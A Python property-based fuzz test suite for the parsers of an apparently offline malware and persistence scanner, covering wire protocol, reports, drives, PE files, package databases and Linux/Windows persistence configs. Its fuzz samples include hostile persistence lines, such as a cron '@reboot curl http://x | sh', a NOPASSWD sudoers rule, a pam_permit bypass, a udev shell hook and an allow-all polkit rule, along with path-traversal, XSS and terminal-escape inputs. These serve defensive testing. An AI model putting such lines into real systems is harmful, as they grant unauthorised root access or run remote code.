"""Property-based fuzzing of everything that parses data from target drives or the wire.

Each parser either returns a result or raises the one exception type it documents;
nothing else may escape (an unexpected exception would skip a check, or take down the
helper). Some properties go further: escaping never lets control characters through,
archive names never escape their directory, decompression stays within its limit.

``HYPOTHESIS_PROFILE=long pytest tests/fuzz`` runs many more examples.
"""

from __future__ import annotations

import gzip
import json
import os
import struct
import unicodedata
from pathlib import PurePosixPath

import pytest

hypothesis = pytest.importorskip("hypothesis")
from hypothesis import HealthCheck, example, given, settings  # noqa: E402
from hypothesis import strategies as st  # noqa: E402

from offscan import names, protocol, reports  # noqa: E402
from offscan.defs import verify  # noqa: E402
from offscan.drives import hibernation, lsblk, mountinfo, osdetect, superblock  # noqa: E402
from offscan.persistence import external, heuristics, linux, packages, windows  # noqa: E402
from offscan.scan import clamd, hashdb, options, pe  # noqa: E402

settings.register_profile("default", max_examples=100, deadline=None,
                          suppress_health_check=[HealthCheck.too_slow])
settings.register_profile("long", max_examples=5000, deadline=None,
                          suppress_health_check=[HealthCheck.too_slow])
settings.load_profile(os.environ.get("HYPOTHESIS_PROFILE", "default"))

text = st.text(alphabet=st.characters(codec="utf-8", exclude_categories=("Cs",)), max_size=400)
lines = st.lists(st.text(max_size=120), max_size=30).map("\n".join)
blobs = st.binary(max_size=4096)


def _unsafe_char(ch: str) -> bool:
    return (unicodedata.category(ch) in ("Cc", "Cf", "Cs", "Zl", "Zp") or ch in names._DISGUISE) and ch != " "


# ------------------------------------------------------------------ wire and names

@given(st.binary(max_size=2048))
@example(b'{"type":"req","id":1,"method":"x","params":' + b"[" * 5000 + b"]" * 5000 + b"}")
@example(b'{"type":"req","id":NaN}')
def test_protocol_decode_raises_only_protocol_errors(line: bytes) -> None:
    try:
        msg = protocol.decode_line(line)
    except protocol.ProtocolError:
        return
    assert isinstance(msg, dict) and msg["type"] in protocol.MESSAGE_TYPES


@given(st.recursive(st.none() | st.booleans() | st.integers() | st.text(max_size=50),
                    lambda inner: st.lists(inner, max_size=5) | st.dictionaries(st.text(max_size=10), inner,
                                                                                max_size=5),
                    max_leaves=30))
def test_protocol_roundtrip(params: object) -> None:
    msg = {"type": "req", "id": 7, "method": "drives.list", "params": {"value": params}}
    line = protocol.encode(msg)
    assert line.endswith(b"\n") and b"\n" not in line[:-1]
    assert protocol.decode_line(line[:-1]) == msg


@given(st.binary(max_size=300))
def test_wire_names_roundtrip(raw: bytes) -> None:
    assert names.from_wire(names.to_wire(raw)) == raw


@given(st.binary(max_size=300) | text)
@example("evil\x1b]0;title\x07name\u202egpj.exe")
def test_display_escapes_every_control_character(path: bytes | str) -> None:
    shown = names.display(path)
    assert not any(_unsafe_char(ch) for ch in shown), repr(shown)
    shown_gui = names.display(path, max_len=40, backslash=False)
    assert len(shown_gui) <= 40 and not any(_unsafe_char(ch) for ch in shown_gui)


@given(st.binary(max_size=300))
def test_display_is_unambiguous(raw: bytes) -> None:
    """Different names never look the same (with backslash escaping on)."""
    other = raw + b"\\"
    assert names.display(raw) != names.display(other)


# ------------------------------------------------------------------------ reports

@given(text)
def test_csv_cells_cannot_start_a_formula(value: str) -> None:
    cell = reports._csv_cell(value)
    assert not cell.startswith(("=", "+", "-", "@", "\t", "\r"))


@given(text, text)
def test_html_report_escapes_target_text(name: str, path: str) -> None:
    det = {"engine": "yara", "name": name + "<script>", "path": path + "<img src=x>", "volume": "sdb1",
           "sha256": "0" * 64, "severity": "high", "size": 1}
    report = reports.build({"detections": 1}, {}, [], [det], {}) if _build_takes_five() else None
    if report is None:
        pytest.skip("reports.build signature changed")
    html = reports.to_html(report)
    assert "<script>" not in html and "<img src=x>" not in html


def _build_takes_five() -> bool:
    import inspect
    return len(inspect.signature(reports.build).parameters) >= 5


# ------------------------------------------------------------- drives and volumes

@given(blobs, st.integers(min_value=0, max_value=1 << 40))
def test_hibernation_header(header: bytes, size: int) -> None:
    state = hibernation.classify_header(header, size)
    assert isinstance(state.hibernated, bool) and isinstance(state.explain(), str)


@given(st.binary(max_size=70000))
def test_superblocks(data: bytes) -> None:
    for parse in (superblock.ext4_state, superblock.btrfs_state, superblock.xfs_state):
        parse(data)
    superblock.looks_like_bitlocker(data[:512])


@given(lines)
def test_text_parsers(data: str) -> None:
    osdetect.parse_os_release(data)
    try:
        mountinfo.parse(data)
    except ValueError:
        pass


@given(st.recursive(st.none() | st.booleans() | st.integers() | st.text(max_size=20),
                    lambda inner: st.lists(inner, max_size=4) | st.dictionaries(
                        st.sampled_from(["name", "path", "type", "fstype", "size", "children", "label",
                                         "uuid", "ro", "rm", "model", "mountpoints", "pkname", "tran"]),
                        inner, max_size=8), max_leaves=40))
def test_lsblk_json(data: object) -> None:
    try:
        lsblk.parse(json.dumps({"blockdevices": data if isinstance(data, list) else [data]}))
    except ValueError:
        pass


# ---------------------------------------------------------------------- scanning

def _pe_like(data: bytes) -> bytes:
    """Random bytes with an MZ header pointing at a PE signature, to get past the first checks."""
    head = bytearray(b"MZ" + bytes(58) + struct.pack("<I", 64) + b"PE\0\0")
    return bytes(head) + data


@given(blobs.map(_pe_like) | blobs)
def test_pe_parser(data: bytes) -> None:
    info = pe.parse(data)
    if info is not None:
        digest = pe.authentihash(data, info)
        assert digest is None or len(digest) in (32, 64)


@given(st.data())
def test_pe_parser_on_mutated_real_file(data: st.DataObject) -> None:
    from support.pefile_gen import make_pe
    raw = bytearray(make_pe())
    for _ in range(data.draw(st.integers(1, 20))):
        raw[data.draw(st.integers(0, len(raw) - 1))] = data.draw(st.integers(0, 255))
    info = pe.parse(bytes(raw))
    if info is not None:
        pe.authentihash(bytes(raw), info)


@given(st.binary(max_size=512))
def test_clamd_reply(raw: bytes) -> None:
    try:
        clamd.parse_reply(raw)
    except clamd.ClamdError:
        pass


@given(st.lists(st.text(max_size=80), max_size=20))
def test_hash_lines(items: list[str]) -> None:
    for digest in hashdb.parse_hex_lines(items, strict=False):
        assert len(digest) == 32
    try:
        list(hashdb.parse_hex_lines(items, strict=True))
    except hashdb.HashDBError:
        pass


@given(st.text(max_size=30))
def test_parse_size(value: str) -> None:
    try:
        size = options.parse_size(value)
    except ValueError:
        return
    assert size >= 0


# ------------------------------------------------------------------- definitions

@given(st.text(max_size=200))
@example("../../etc/passwd")
@example("/abs/path")
@example("a/./../../b")
@example("C:\\windows\\x")
def test_archive_member_names_stay_inside(name: str) -> None:
    safe = verify.safe_member_name(name)
    if safe is not None:
        assert isinstance(safe, PurePosixPath)
        assert not safe.is_absolute() and ".." not in safe.parts and safe.parts


@given(lines, st.none() | st.text(max_size=30))
def test_checksum_files(data: str, name: str | None) -> None:
    try:
        digest = verify.parse_checksum_file(data, name)
    except verify.VerificationError:
        return
    assert isinstance(digest, str)


# ------------------------------------------------------------------ persistence

@given(text)
def test_heuristics_and_command_targets(command: str) -> None:
    for assess in (heuristics.assess_windows, heuristics.assess_linux):
        severity, reasons = assess(command)
        assert severity in heuristics.SEVERITY_ORDER if hasattr(heuristics, "SEVERITY_ORDER") else True
        assert isinstance(reasons, list)
    heuristics.command_target(command)
    heuristics.command_target(command, "linux")
    linux.command_target(command)


@settings(deadline=2000)
@given(st.text(alphabet=" \t\"'\\/%$-;|&abcdefABCDEF0123456789=.:()[]", min_size=1000, max_size=5000))
def test_heuristics_are_fast_on_long_input(command: str) -> None:
    """No catastrophic backtracking: a few thousand characters take milliseconds."""
    heuristics.assess_windows(command)
    heuristics.assess_linux(command)


def _linux_ctx() -> linux._Ctx:
    return linux._Ctx([{"name": "root", "uid": 0, "home": "/root"}])


LINUX_ANALYZERS = [
    ("cron", lambda e, d, c: linux.analyze_cron({**e, "kind": "cron"}, d, c)),
    ("crontab", lambda e, d, c: linux.analyze_cron({**e, "kind": "crontab"}, d, c)),
    ("anacron", lambda e, d, c: linux.analyze_cron({**e, "kind": "anacron"}, d, c)),
    ("script", lambda e, d, c: linux.analyze_script(e, d, c, "linux.script", "Script", "T1037")),
    ("desktop", lambda e, d, c: linux.analyze_desktop(e, d, c, False)),
    ("dbus", lambda e, d, c: linux.analyze_dbus(e, d, c, False)),
    ("initramfs", linux.analyze_initramfs),
    ("rc_local", linux.analyze_rc_local),
    ("authorized_keys", linux.analyze_authorized_keys),
    ("sudoers", linux.analyze_sudoers),
    ("pam", linux.analyze_pam),
    ("udev", lambda e, d, c: linux.analyze_udev(e, d, c, False)),
    ("hooks", lambda e, d, c: linux.analyze_hooks(e, d, c, False)),
    ("modprobe", linux.analyze_modprobe),
    ("preload", linux.analyze_preload),
    ("ldconf", linux.analyze_ldconf),
    ("grub", linux.analyze_grub),
    ("polkit", lambda e, d, c: linux.analyze_polkit(e, d, c, False)),
]

config_bytes = st.one_of(
    blobs,
    st.lists(st.sampled_from([
        "* * * * * root /tmp/x", "@reboot curl http://x | sh", "SHELL=/bin/sh", "1 5 cron.daily run-parts",
        "Exec=/home/u/.x", "[Desktop Entry]", "ssh-rsa AAAA user@host", 'command="x" ssh-ed25519 AAAA',
        "ALL ALL=(ALL) NOPASSWD: ALL", "auth sufficient pam_permit.so", 'RUN+="/bin/sh -c x"',
        "install usb /tmp/x", "/lib/x.so", "include /etc/ld.so.conf.d/*.conf", "linux /vmlinuz init=/bin/sh",
        "polkit.addRule(function(a,s){return polkit.Result.YES;});", "\x00\xff", "#", "",
    ]) | st.text(max_size=60), max_size=20).map(lambda ls: "\n".join(ls).encode("utf-8", "surrogateescape")),
)


@given(st.sampled_from(LINUX_ANALYZERS), config_bytes, st.integers(0, 0o7777),
       st.none() | st.integers(0, 70000))
def test_linux_analyzers(analyzer, data: bytes, mode: int, uid: int | None) -> None:
    _name, func = analyzer
    entry = {"file": "/etc/test", "kind": "test", "mode": mode, "uid": uid, "user": "root"}
    ctx = _linux_ctx()
    func(entry, data, ctx)
    for finding in ctx.findings:
        assert finding.severity in ("info", "low", "medium", "high")


@given(st.lists(st.tuples(st.sampled_from(["svc.service", "a.timer", "b.socket", "c.path", "d.conf"]),
                          config_bytes), max_size=6))
def test_systemd_units(units: list[tuple[str, bytes]]) -> None:
    entries = [({"file": f"/etc/systemd/system/{name}", "kind": "systemd", "mode": 0o644, "uid": 0}, data)
               for name, data in units]
    linux.analyze_systemd(entries, _linux_ctx())
    for _entry, data in entries:
        linux.parse_unit(data)


@given(config_bytes, config_bytes, config_bytes)
def test_accounts(passwd: bytes, shadow: bytes, group: bytes) -> None:
    linux.analyze_accounts(passwd, shadow, group, {}, _linux_ctx())


@given(config_bytes)
def test_sshd(data: bytes) -> None:
    linux.analyze_sshd([({"file": "/etc/ssh/sshd_config", "kind": "sshd", "mode": 0o644, "uid": 0}, data)],
                       _linux_ctx())


task_xml = st.builds(
    lambda cmd, args, hidden, enc: (
        '<?xml version="1.0" encoding="UTF-16"?><Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
        f"<Settings><Hidden>{hidden}</Hidden></Settings><Actions><Exec><Command>{cmd}</Command>"
        f"<Arguments>{args}</Arguments></Exec></Actions></Task>").encode(enc, "surrogatepass"),
    st.text(max_size=40), st.text(max_size=40), st.sampled_from(["true", "false", "x"]),
    st.sampled_from(["utf-8", "utf-16"]))


@given(task_xml | blobs)
@example(b'<?xml version="1.0"?><!DOCTYPE t [<!ENTITY a "aaaaaaaaaa">]><Task>&a;</Task>')
def test_task_xml(data: bytes) -> None:
    ctx = windows._Ctx()
    windows.analyze_task_xml(data, "Windows/System32/Tasks/x", "x", ctx)
    if b"<!ENTITY" in data:
        assert ctx.errors and not ctx.findings


@given(st.binary(max_size=8192).map(lambda b: b + b"CommandLineEventConsumer" + b))
def test_wmi_repository(data: bytes) -> None:
    windows.analyze_wmi(data, "Windows/System32/wbem/Repository/OBJECTS.DATA", windows._Ctx())


@given(st.text(max_size=2000), st.sampled_from(["", "/mnt/target"]))
def test_chkrootkit_output(output: str, prefix: str) -> None:
    for finding in external.parse_chkrootkit(output, prefix):
        assert finding.severity in ("info", "low", "medium", "high")


@given(st.lists(st.dictionaries(st.sampled_from(["Timestamp", "RuleTitle", "Level", "Computer", "Channel",
                                                 "EventID", "RecordID", "Details", "RuleID"]),
                                st.none() | st.text(max_size=30) | st.integers() | st.dictionaries(
                                    st.text(max_size=5), st.text(max_size=5), max_size=3)),
                max_size=10))
def test_hayabusa_and_chainsaw_output(records: list[dict]) -> None:
    jsonl = "\n".join(json.dumps(r) for r in records) + "\nnot json\n"
    external.parse_hayabusa(jsonl)
    external.parse_chainsaw(records)
    external.parse_chainsaw({"unexpected": records})


# --------------------------------------------------------------- package databases

@given(st.binary(max_size=2048))
def test_rpm_headers(blob: bytes) -> None:
    try:
        packages.parse_rpm_header(blob)
    except ValueError:
        pass


def _rpm_header(entries: list[tuple[int, int, bytes, int]]) -> bytes:
    index, data = b"", b""
    for tag, typ, payload, count in entries:
        index += struct.pack(">iIiI", tag, typ, len(data), count)
        data += payload
    return struct.pack(">II", len(entries), len(data)) + index + data


@given(st.lists(st.tuples(st.sampled_from(sorted(packages.WANTED)), st.integers(0, 9),
                          st.binary(max_size=64), st.integers(0, 40)), max_size=12))
def test_rpm_headers_with_valid_layout(entries: list) -> None:
    try:
        packages.parse_rpm_header(_rpm_header(entries))
    except ValueError:
        pass


@given(st.binary(max_size=4096), st.integers(0, 8))
def test_rpm_ndb(data: bytes, pages: int) -> None:
    db = b"RpmP" + bytes(8) + struct.pack("<I", pages) + bytes(16) + data
    try:
        for blob in packages.iter_ndb(db):
            assert isinstance(blob, bytes)
    except ValueError:
        pass


@given(st.text(max_size=200))
@example("\\777\\400")
def test_mtree_paths(raw: str) -> None:
    assert isinstance(packages._mtree_path(raw), str)


@given(st.binary(max_size=2048), st.integers(1, 1 << 16))
def test_gunzip_respects_its_limit(data: bytes, limit: int) -> None:
    for blob in (data, gzip.compress(data), gzip.compress(data)[: max(1, len(data) // 2)]):
        try:
            out = packages._gunzip(blob, limit)
        except (ValueError, EOFError, packages.zlib.error):
            continue
        assert len(out) <= max(limit, len(blob)) if blob[:2] != b"\x1f\x8b" else len(out) <= limit


def test_gunzip_refuses_a_bomb() -> None:
    bomb = gzip.compress(bytes(32 << 20))
    with pytest.raises(ValueError):
        packages._gunzip(bomb, 1 << 20)


@given(st.text(max_size=200))
def test_path_normalisation(path: str) -> None:
    out = packages.norm(path)
    assert isinstance(out, str)
    assert packages.norm(out) == out          # idempotent


def _memfd_pack(items: list[tuple[dict, bytes]]) -> tuple[int, list[dict]]:
    fd = os.memfd_create("fuzz-pack", os.MFD_CLOEXEC)
    index, offset = [], 0
    for entry, data in items:
        os.pwrite(fd, data, offset)
        index.append({**entry, "offset": offset, "length": len(data)})
        offset += len(data)
    return fd, index


mtree_lines = st.lists(st.sampled_from([
    "#mtree", "/set type=file uid=0 gid=0 mode=644", "./usr/bin/ls size=10 sha256digest=" + "a" * 64,
    "./usr/bin/\\777\\400 md5digest=" + "b" * 32, "./.PKGINFO size=1", "/unset all", "   ", "./usr",
    "./etc/x type=dir", "./a md5digest=", "./b size=x sha256digest=z",
]) | st.text(max_size=40), max_size=15).map(lambda ls: "\n".join(ls).encode("latin-1", "replace"))


@given(st.lists(st.tuples(st.text(max_size=10), st.sampled_from(["desc", "files", "mtree"]),
                          blobs | mtree_lines | mtree_lines.map(gzip.compress)), max_size=12))
@example([("pkg-1", "mtree", gzip.compress(b"./usr/bin/\\777 md5digest=" + b"b" * 32)),
          ("ok-1", "mtree", gzip.compress(b"./usr/bin/ok md5digest=" + b"c" * 32))])
def test_pacman_database(items: list[tuple[str, str, bytes]]) -> None:
    fd, index = _memfd_pack([({"file": f"var/lib/pacman/local/{pkg}/{kind}", "kind": kind, "package": pkg},
                              data) for pkg, kind, data in items])
    try:
        result = packages.task_list({"manager": "pacman", "pack": 0, "index": index}, [fd])
    finally:
        os.close(fd)
    assert isinstance(result["files"], list)
    if any(pkg == "ok-1" for pkg, _k, _d in items):
        assert any(f[0] == "/usr/bin/ok" for f in result["files"])     # the good package is still read


dpkg_text = st.lists(st.sampled_from([
    "Package: coreutils", "Status: install ok installed", "Conffiles:", " /etc/x " + "a" * 32,
    " /etc/y " + "b" * 32 + " obsolete", "", "Status:", "Package:", "a" * 32 + "  usr/bin/ls",
    "/usr/bin/ls", "/.", "/etc/x", "/etc/x.distrib", "coreutils",
]) | st.text(max_size=40), max_size=20).map(lambda ls: "\n".join(ls).encode("utf-8", "surrogateescape"))


@given(st.lists(st.tuples(st.sampled_from(["status", "diversions", "md5sums", "list"]), dpkg_text | blobs),
                max_size=8))
def test_dpkg_database(items: list[tuple[str, bytes]]) -> None:
    fd, index = _memfd_pack([({"file": f"var/lib/dpkg/info/pkg{i}.{kind}", "kind": kind}, data)
                             for i, (kind, data) in enumerate(items)])
    try:
        result = packages.task_list({"manager": "dpkg", "pack": 0, "index": index}, [fd])
    finally:
        os.close(fd)
    for path, _pkg, algo, digest, _flags, _size in result["files"]:
        assert path.startswith("/") and algo == "md5" and len(digest) == 32
